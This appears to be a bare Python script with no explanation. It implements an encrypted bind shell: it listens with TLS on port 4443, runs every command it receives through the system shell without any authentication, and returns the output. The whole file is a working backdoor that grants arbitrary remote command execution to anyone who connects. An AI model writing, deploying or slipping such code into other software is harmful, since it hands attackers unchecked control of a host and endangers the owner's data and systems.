import ssl
import socket
import subprocess

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile="server.crt", keyfile="server.key")

bindsocket = socket.socket()
bindsocket.bind(('', 4443))
bindsocket.listen(5)

while True:
    newsocket, fromaddr = bindsocket.accept()
    conn = context.wrap_socket(newsocket, server_side=True)
    cmd = conn.recv(1024).decode()
    if cmd == "exit":
        conn.close()
        break
    else:
        output = subprocess.getoutput(cmd)
        conn.send(output.encode())
    conn.shutdown(socket.SHUT_RDWR)
    conn.close()
